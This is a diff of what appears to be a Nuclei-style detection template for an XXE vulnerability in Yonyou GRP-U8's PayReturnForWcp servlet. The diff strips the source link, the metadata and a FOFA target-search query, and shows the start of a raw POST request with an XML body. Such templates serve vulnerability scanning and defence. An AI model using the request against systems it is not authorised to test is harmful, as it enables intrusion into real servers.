@@ -3,12 +3,8 @@ info:
   name: 用友GRP-U8-XXE-PayReturnForWcp
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tosy69mo4ntk8xop'
+  description: ''
   tags: xxe,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tosy69mo4ntk8xop
-    fofa: body="GRP-U8" || body="R9iPortal"
 http:
 - raw:
   - 'POST /servlet/PayReturnForWcp HTTP/1.1
@@ -39,8 +35,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     <?xml version="1.0"?>
